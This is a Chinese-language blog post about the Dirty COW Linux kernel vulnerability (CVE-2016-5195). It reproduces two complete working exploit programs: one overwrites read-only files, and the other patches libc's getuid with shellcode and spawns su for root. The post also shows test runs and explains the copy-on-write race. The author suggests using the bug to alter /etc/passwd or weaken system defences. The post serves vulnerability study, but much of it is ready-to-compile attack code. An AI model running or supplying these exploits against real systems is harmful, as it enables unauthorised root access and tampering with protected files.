---
layout: post
title: CVE-2016-5195 | Dirty CoW
category: Sec
commentIssueId: 3
---

# CVE-2016-5195 DirtyCoW

## 简介

下面内容来自 360 安全客，链接在*参考*一节。

漏洞编号：CVE-2016-5195  
漏洞名称：脏牛（Dirty COW）  
漏洞危害：低权限用户利用该漏洞技术可以在全版本Linux系统上实现本地提权  
影响范围：Linux内核>=2.6.22（2007年发行）开始就受影响了，直到2016年10月18日才修复。

360 Vulpecker Team：Android 7.0最新的10月补丁安全级别的系统上测试过漏洞POC，确认 Android 受影响

**Linux内核的内存子系统在处理写时拷贝（Copy-on-Write)时存在条件竞争漏洞，导致可以破坏私有只读内存映射。一个低权限的本地用户能够利用此漏洞获取其他只读内存映射的写权限，有可能进一步导致提权漏洞。**

**如何修复**

Linux团队正在积极的修复此漏洞，可以通过系统更新到最新发行版修复此漏洞。软件开发人员也可以通过

https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/？id=19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619

重新编译Linux修复此漏洞。

## PoC及原理

内容来自 Github，详见参考链接

{% highlight c %}
/*
####################### dirtyc0w.c #######################
$ sudo -s
# echo this is not a test > foo
# chmod 0404 foo
$ ls -lah foo
-r-----r-- 1 root root 19 Oct 20 15:23 foo
$ cat foo
this is not a test
$ gcc -lpthread dirtyc0w.c -o dirtyc0w
$ ./dirtyc0w foo m00000000000000000
mmap 56123000
madvise 0
procselfmem 1800000000
$ cat foo
m00000000000000000
####################### dirtyc0w.c #######################
*/
#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
 
void *map;
int f;
struct stat st;
char *name;
 
void *madviseThread(void *arg)
{
  char *str;
  str=(char*)arg;
  int i,c=0;
  for(i=0;i<100000000;i++)
  {
/*
You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661
> This is achieved by racing the madvise(MADV_DONTNEED) system call
> while having the page of the executable mmapped in memory.
*/
    c+=madvise(map,100,MADV_DONTNEED);
  }
  printf("madvise %d\n\n",c);
}
 
void *procselfmemThread(void *arg)
{
  char *str;
  str=(char*)arg;
/*
You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16
>  The in the wild exploit we are aware of doesn't work on Red Hat
>  Enterprise Linux 5 and 6 out of the box because on one side of
>  the race it writes to /proc/self/mem, but /proc/self/mem is not
>  writable on Red Hat Enterprise Linux 5 and 6.
*/
  int f=open("/proc/self/mem",O_RDWR);
  int i,c=0;
  for(i=0;i<100000000;i++) {
/*
You have to reset the file pointer to the memory position.
*/
    lseek(f,map,SEEK_SET);
    c+=write(f,str,strlen(str));
  }
  printf("procselfmem %d\n\n", c);
}
 
int main(int argc,char *argv[])
{
/*
You have to pass two arguments. File and Contents.
*/
  if (argc<3)return 1;
  pthread_t pth1,pth2;
/*
You have to open the file in read only mode.
*/
  f=open(argv[1],O_RDONLY);
  fstat(f,&st);
  name=argv[1];
/*
You have to use MAP_PRIVATE for copy-on-write mapping.
> Create a private copy-on-write mapping.  Updates to the
> mapping are not visible to other processes mapping the same
> file, and are not carried through to the underlying file.  It
> is unspecified whether changes made to the file after the
> mmap() call are visible in the mapped region.
*/
/*
You have to open with PROT_READ.
*/
  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
  printf("mmap %x\n\n",map);
/*
You have to do it on two threads.
*/
  pthread_create(&pth1,NULL,madviseThread,argv[1]);
  pthread_create(&pth2,NULL,procselfmemThread,argv[2]);
/*
You have to wait for the threads to finish.
*/
  pthread_join(pth1,NULL);
  pthread_join(pth2,NULL);
  return 0;
}
{% endhighlight %}

## PoC Test

Environment:

Ubuntu 14.04 LTS  
Linux Kernel 3.13.0-98-generic

测试按照 PoC 源代码首部注释所述进行：

![0]({{ site.url }}/images/dirtycow/dirtycow-0.png)

![0]({{ site.url }}/images/dirtycow/dirtycow-1.png)

![0]({{ site.url }}/images/dirtycow/dirtycow-2.png)

![0]({{ site.url }}/images/dirtycow/dirtycow-3.png)

多次测试后发现写入不太稳定，比如上例中 **hello,world** 并没有完全写入。这可能会给提权带来一些困难，比如我们要在当前用户下把 `/etc/passwd` 中对应 uid 改成 0，这可能需要配合一些其他技巧。但是洞确实挺厉害。即使不用做提权，用来修改一些重要的配置文件也是不错的，或许可以降低整个系统的防御能力。

## Exp及原理

下面是 Github 上的 dirtycow-mem.c，在下个部分中我将对此代码进行测试。

{% highlight c %}
/*
 * CVE-2016-5195 dirtypoc
 *
 * This PoC is memory only and doesn't write anything on the filesystem.
 * /!\ Beware, it triggers a kernel crash a few minutes.
 *
 * gcc -Wall -o dirtycow-mem dirtycow-mem.c -ldl -lpthread
 */

#define _GNU_SOURCE
#include <err.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <pthread.h>
#include <stdbool.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <sys/types.h>


#define SHELLCODE	"\x31\xc0\xc3"
#define SPACE_SIZE	256
#define LIBC_PATH	"/lib/x86_64-linux-gnu/libc.so.6"
#define LOOP		0x1000000

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

struct mem_arg  {
	struct stat st;
	off_t offset;
	unsigned long patch_addr;
	unsigned char *patch;
	unsigned char *unpatch;
	size_t patch_size;
	bool do_patch;
	void *map;
};


static int check(bool do_patch, const char *thread_name)
{
	uid_t uid;

	uid = getuid();

	if (do_patch) {
		if (uid == 0) {
			printf("[*] patched (%s)\n", thread_name);
			return 1;
		}
	} else {
		if (uid != 0) {
			printf("[*] unpatched: uid=%d (%s)\n", uid, thread_name);
			return 1;
		}
	}

	return 0;
}


static void *madviseThread(void *arg)
{
	struct mem_arg *mem_arg;
	size_t size;
	void *addr;
	int i, c = 0;

	mem_arg = (struct mem_arg *)arg;
	addr = (void *)(mem_arg->offset & (~(PAGE_SIZE - 1)));
	size = mem_arg->offset - (unsigned long)addr;

	for(i = 0; i < LOOP; i++) {
		c += madvise(addr, size, MADV_DONTNEED);

		if (i % 0x1000 == 0 && check(mem_arg->do_patch, __func__))
			break;
	}

	if (c == 0x1337)
		printf("[*] madvise = %d\n", c);

	return NULL;
}

static void *procselfmemThread(void *arg)
{
	struct mem_arg *mem_arg;
	int fd, i, c = 0;
	unsigned char *p;

	mem_arg = (struct mem_arg *)arg;
	p = mem_arg->do_patch ? mem_arg->patch : mem_arg->unpatch;

	fd = open("/proc/self/mem", O_RDWR);
	if (fd == -1)
		err(1, "open(\"/proc/self/mem\"");

	for (i = 0; i < LOOP; i++) {
		lseek(fd, mem_arg->offset, SEEK_SET);
		c += write(fd, p, mem_arg->patch_size);

		if (i % 0x1000 == 0 && check(mem_arg->do_patch, __func__))
			break;
	}

	if (c == 0x1337)
		printf("[*] /proc/self/mem %d\n", c);

	close(fd);

	return NULL;
}

static int get_range(unsigned long *start, unsigned long *end)
{
	char line[4096];
	char filename[PATH_MAX];
	char flags[32];
	FILE *fp;
	int ret;

	ret = -1;

	fp = fopen("/proc/self/maps", "r");
	if (fp == NULL)
		err(1, "fopen(\"/proc/self/maps\")");

	while (fgets(line, sizeof(line), fp) != NULL) {
		sscanf(line, "%lx-%lx %s %*Lx %*x:%*x %*Lu %s", start, end, flags, filename);

		if (strstr(flags, "r-xp") == NULL)
			continue;

		if (strstr(filename, "/libc-") == NULL)
			continue;
		//printf("[%lx-%6lx][%s][%s]\n", start, end, flags, filename);
		ret = 0;
		break;
	}

	fclose(fp);

	return ret;
}

static void getroot(void)
{
	execlp("su", "su", NULL);
	err(1, "failed to execute \"su\"");
}

static void exploit(struct mem_arg *mem_arg, bool do_patch)
{
	pthread_t pth1, pth2;

	printf("[*] exploiting (%s)\n", do_patch ? "patch": "unpatch");

	mem_arg->do_patch = do_patch;

	pthread_create(&pth1, NULL, madviseThread, mem_arg);
	pthread_create(&pth2, NULL, procselfmemThread, mem_arg);

	pthread_join(pth1, NULL);
	pthread_join(pth2, NULL);
}

static unsigned long get_getuid_addr(void)
{
	unsigned long addr;
	void *handle;
	char *error;

	dlerror();

	handle = dlopen("libc.so.6", RTLD_LAZY);
	if (handle == NULL) {
		fprintf(stderr, "%s\n", dlerror());
		exit(EXIT_FAILURE);
	}

	addr = (unsigned long)dlsym(handle, "getuid");
	error = dlerror();
	if (error != NULL) {
		fprintf(stderr, "%s\n", error);
		exit(EXIT_FAILURE);
	}

	dlclose(handle);

	return addr;
}

int main(int argc, char *argv[])
{
	unsigned long start, end;
	unsigned long getuid_addr;
	struct mem_arg mem_arg;
	struct stat st;
	pid_t pid;
	int fd;

	if (get_range(&start, &end) != 0)
		errx(1, "failed to get range");

	printf("[*] range: %lx-%lx]\n", start, end);

	getuid_addr = get_getuid_addr();
	printf("[*] getuid = %lx\n", getuid_addr);

	mem_arg.patch = malloc(sizeof(SHELLCODE)-1);
	if (mem_arg.patch == NULL)
		err(1, "malloc");

	mem_arg.unpatch = malloc(sizeof(SHELLCODE)-1);
	if (mem_arg.unpatch == NULL)
		err(1, "malloc");

	memcpy(mem_arg.unpatch, (void *)getuid_addr, sizeof(SHELLCODE)-1);
	memcpy(mem_arg.patch, SHELLCODE, sizeof(SHELLCODE)-1);
	mem_arg.patch_size = sizeof(SHELLCODE)-1;
	mem_arg.do_patch = true;

	fd = open(LIBC_PATH, O_RDONLY);
	if (fd == -1)
		err(1, "open(\"" LIBC_PATH "\")");
	if (fstat(fd, &st) == -1)
		err(1, "fstat");

	mem_arg.map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
	if (mem_arg.map == MAP_FAILED)
		err(1, "mmap");
	close(fd);

	printf("[*] mmap %p\n", mem_arg.map);

	mem_arg.st = st;
	mem_arg.offset = (off_t)((unsigned long)mem_arg.map + getuid_addr - start);

	exploit(&mem_arg, true);

	pid = fork();
	if (pid == -1)
		err(1, "fork");

	if (pid == 0) {
		getroot();
	} else {
		sleep(2);
		exploit(&mem_arg, false);
		if (waitpid(pid, NULL, 0) == -1)
			warn("waitpid");
	}

	return 0;
}
{% endhighlight %}

## Exp Test

测试环境：

Kali Linux 2016.2 version  
Linux 4.6.0 内核

编译报了几个 Warning:

![dirtycow-exp-0]({{ site.url }}/images/dirtycow/dirtycow-exp-0.jpg)

目录下还有一个 remain.sh，内容为：

```
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
```

目的是防止提权后死机。需要在提权成功后立即运行。

结果：

![dirtycow-exp-1]({{ site.url }}/images/dirtycow/dirtycow-exp-1.jpg)

## 漏洞成因

很大程度上是理解*参考链接*中第三、四篇文章。

这个漏洞理解起来需要一些Linux内核知识，涉及到内存管理的问题。我目前不能确定自己理解的是不是正确，所以采用这种带日期形式的记录，无论对错，一律记下来。这样也可以看出自己理解上的变化。

**2016-11-06**

这个漏洞的本质是**对任意只读文件越权写入**。比如用户br对属于root的`-rw-------`文件进行写入操作。

按照常理，这是不可以的。然而，我们注意到`/proc/self/mem`这个特殊文件，参考`man proc`:

```
/proc/[pid]/mem

This file can be used to access the pages of a process's memory through open(2), read(2), and
lseek(2).
```

也就是说，我们可以通过读写这个文件，来对当前进程的虚拟内存空间进行读写（这里涉及到虚拟内存/物理内存的概念，可以参考CSAPP第二版第九章）。而且，通过`ls -al`我们可以看到当前用户对于这个文件是具有写权限的：

```
-rw------- 1 br br 0 11月  6 21:28 /proc/self/mem
```

这样，就有一个思路（即使没有这个漏洞），我们把一个只读文件映射到我自己当前进程的`/proc/self/mem`中，然后对它内存进行强制写入（因为我们对`/proc/self/mem`具有写权限啊），不就越权写了？

还是接着正常思路分析，首先，我们要想把文件映射到虚拟内存当中，需要使用`mmap`函数（你用一般的`open`或者`fopen`使用`w`或者`a`标志打开肯定是要失败的，具体参考`man open`）。参考`man mmap`：

```
void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);

The prot argument describes the desired memory protection of the mapping (and must not conflict with the open mode of the file)
```

我们只能够先以`PROT_READ`方式映射，另外漏洞利用要使用写时拷贝(COW)与竞态条件，所以这里flags设置为`MAP_PRIVATE`。按照正常思路，是不会越权的，即使我们把只读文件映射到了我们自己的虚拟内存空间中。参考链接中第三篇说的很好：如果进程写入的虚拟内存是`MAP_SHARED`，那么当初在做`mmap`的时候就应该具有写权限了，这样写入不算越权；如果写入的是`MAP_PRIVATE`，那么会触发COW机制，原文件不会被改变，所以也没有越权。正常思路到这里就结束了，没办法越权。

现在要补充一些关于`mmap`的细节(参考链接第八篇文章对`mmap`讲解的很好)。`mmap`仅仅是将虚拟地址和文件硬盘地址关联起来，并没有真正把文件内容读入内存。进程第一次访问文件时，发生缺页异常，系统进行调页，之后文件才会存在于内存。Exploit正是从这里开始。

执行写入操作，使用`get_user_pages`获取页。  
`get_user_pages`使用`follow_page_mask`查找对应页，而之前讲过，文件并不在内存中，引发缺页异常，获取失败，进行调页；  
第二次`follow_page_mask`，由于带着`FOLL_WRITE`标志，这与可读文件的映射冲突，获取页失败，**此时调用`do_wp_page`进行COW，并去掉`FOLL_WRITE`标记！！**；  
第三次`follow_page_mask`，由于不再需要`FOLL_WRITE`，获取页成功（当然，获取的是COW的新页）。

看起来皆大欢喜。但是，`get_user_pages`函数内恰好有一个`cond_resched()`，这就给竞态条件创造可能。而我们的程序是一个多线程程序，一个线程进行上述操作，另一个线程调用了`madvise`函数（关于这个函数，参考`man madvise`）告诉系统，上面新搞出来的COW页我不要啦以后都不用了，系统就会把对应页表项清除（当然，这里就用到“竞态条件”了，需要这个线程刚好在上面COW页搞定之后，写入发生之前被调度上台）。然后嘞，原先那个线程的第三次`follow_page_mask`开始了，本来会成功获取COW页，但意外地失败了（被另一个线程搞的），发现页并不在内存中，只好再次调页。注意，这个时候调页是把文件调到内存中，不是COW页！！！而且，对于这种特殊情况，Linux kernel并没有恢复`FOLL_WRITE`标志，所以第四次`follow_page_mask`时，成功获取到真实页，没有COW。越权写入开始 : )

**以上内容是我从360安全客上看到的，带着自己的理解，复述一遍。**

后来我在参考链接四文章后向作者提问，感谢作者帮我解答疑惑，附在这里：

> 您好，我想请教您一下，madvise释放掉的内存页是COW出来的内存页，那么文件刚开始通过mmap映射到物理内存中的那一份还在？（就是get_user_page发现缺页时调入的页），那么get_user_page第三次再次调页时，相当于内存中有两份文件的映射，未标记FOLL_WRITE的get_user_page获取的是新调入的那个映射？

> 您再看看整个流程，多留意下do_cow_fault和do_wp_page函数^_^，并没有复制一份。

**漏洞产生处代码逻辑分析**

这里使用第四个参考链接里面介绍的++[Linux4.7内核代码](https://www.kernel.org/pub/linux/kernel/v4.x/linux-4.7.tar.xz)++:

**漏洞利用的死机问题**

漏洞放出后，很多人测试提权成功，但是系统会死机。这就尴尬了。这是Why？

## References

- [【漏洞预警】CVE-2016-5195脏牛漏洞：Linux内核通杀提权漏洞（10.21 9:10更新）](http://bobao.360.cn/learning/detail/3123.html)

- [Github: DirtyCow](https://github.com/dirtycow)

- [【漏洞分析】CVE-2016-5195 DirtyC0w: Linux内核提权漏洞分析](http://bobao.360.cn/learning/detail/3132.html)

- [【漏洞分析】11月4日：深入解读脏牛Linux本地提权漏洞（CVE-2016-5195）](http://bobao.360.cn/learning/detail/3163.html)

- [Github上的各种PoC](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)

- [Linux Kernel 2.6.22 < 3.9 (x86/x64) - 'Dirty COW' Race Condition Privilege Escalation (SUID)](https://www.exploit-db.com/exploits/40616/)

- [mm: remove gup_flags FOLL_WRITE games from __get_user_pages()](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619)

- [认真分析mmap：是什么 为什么 怎么用](http://www.cnblogs.com/huxiao-tee/p/4660352.html)
